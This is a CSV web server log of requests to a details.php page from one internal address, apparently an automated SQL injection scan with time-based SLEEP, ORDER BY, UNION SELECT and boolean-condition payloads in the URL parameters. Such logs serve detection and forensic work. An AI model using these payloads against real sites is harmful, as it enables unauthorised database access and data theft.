full_url,event_time,hostname
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%285%29%29%29AXjG%29&type=2,1680093079.912018,10.0.2.31
/details.php?prod=5%20ORDER%20BY%201--%20-&type=2,1680093084.926514,10.0.2.31
/details.php?prod=5%20ORDER%20BY%209192--%20-&type=2,1680093084.936275,10.0.2.31
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=2,1680093084.945644,10.0.2.31
/details.php?prod=5%20ORDER%20BY%206--%20-&type=2,1680093084.969451,10.0.2.31
/details.php?prod=5%20ORDER%20BY%204--%20-&type=2,1680093084.984144,10.0.2.31
/details.php?prod=5%20ORDER%20BY%205--%20-&type=2,1680093084.990428,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x6e62536f44566564455244695669786c737563647869424e7a504253434e6759454f474d69527a68%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,1680093084.999157,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x65766d6c7650734b6c664167464a4877485676514d44764b6263576f6e617459426156636862474a%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.005559,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x4e63674c434b586141725757746574736f5a434f61575345686d424e4f4d487144426641444a6145%2C0x7178706a71%29%2CNULL--%20-&type=2,1680093085.013564,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x4c53626451794f7056504d6243526c5a63624f66777244524f794b666d6a435358677a6a4e624f61%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.018106,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x47467a78564b796f716e62477a5142685066646b4268546479586b75534d53705875614a4f4b4650%2C0x7178706a71%29--%20-&type=2,1680093085.023116,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x72454866616d476d6557%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,1680093085.037734,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x786b4b586d4e6352676c%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.044036,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x68477677566157555472%2C0x7178706a71%29%2CNULL--%20-&type=2,1680093085.048062,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x696d5645467a77464966%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.052877,10.0.2.31
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7952746142697372506c%2C0x7178706a71%29--%20-&type=2,1680093085.057227,10.0.2.31
/details.php?prod=-4064%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7a72765a6b50446c514c74636c5767655748475263464f437572424f78707876614f6b43786f696a%2C0x7178706a71%29%2CNULL--%20-&type=2,1680093085.061935,10.0.2.31
/details.php?prod=-4137%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x4f7749534661556e684374724c706c4355644a6f5a44445a44684b4a664c67497455524e4f715749%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.066845,10.0.2.31
/details.php?prod=-3940%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C%28CASE%20WHEN%20%287430%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%207430%29%20THEN%201%20ELSE%200%20END%29%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,1680093085.085463,10.0.2.31
/details.php?prod=5&type=6393,1680093125.274132,10.0.2.31
/details.php?prod=5&type=2%2C%28%29%28%27%29%2C.%22%2C,1680093125.278063,10.0.2.31
/details.php?prod=5&type=2%27HljAqz%3C%27%22%3EyHOwmz,1680093125.28192,10.0.2.31
/details.php?prod=5&type=2%29%20AND%208716%3D9109%20AND%20%281552%3D1552,1680093125.340744,10.0.2.31
/details.php?prod=5&type=2%29%20AND%203472%3D3472%20AND%20%287932%3D7932,1680093125.344733,10.0.2.31
/details.php?prod=5&type=2%29%29%20AND%205166%3D2352%20AND%20%28%287644%3D7644,1680093125.348652,10.0.2.31
/details.php?prod=5&type=2%29%29%20AND%203472%3D3472%20AND%20%28%287331%3D7331,1680093125.353153,10.0.2.31
/details.php?prod=5&type=2%20AND%204617%3D5756,1680093125.357297,10.0.2.31
/details.php?prod=5&type=2%20AND%203472%3D3472,1680093125.360217,10.0.2.31
/details.php?prod=5&type=2%20AND%206407%3D2358--%20fzKA,1680093125.371029,10.0.2.31
/details.php?prod=5&type=2%20AND%203472%3D3472--%20uzEC,1680093125.375771,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%206581%3D1433%20AND%20%28%27LKYQ%27%3D%27LKYQ,1680093125.389836,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27QZkv%27%3D%27QZkv,1680093125.39359,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%209127%3D4603%20AND%20%28%28%27xkiu%27%3D%27xkiu,1680093125.397625,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%203472%3D3472%20AND%20%28%28%27TlOA%27%3D%27TlOA,1680093125.402732,10.0.2.31
/details.php?prod=5&type=2%27%20AND%202543%3D5552%20AND%20%27VekL%27%3D%27VekL,1680093125.40682,10.0.2.31
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27MyDi%27%3D%27MyDi,1680093125.410789,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%202508%3D8310%20AND%20%28%27neNd%27%20LIKE%20%27neNd,1680093125.415841,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27JVCY%27%20LIKE%20%27JVCY,1680093125.42012,10.0.2.31
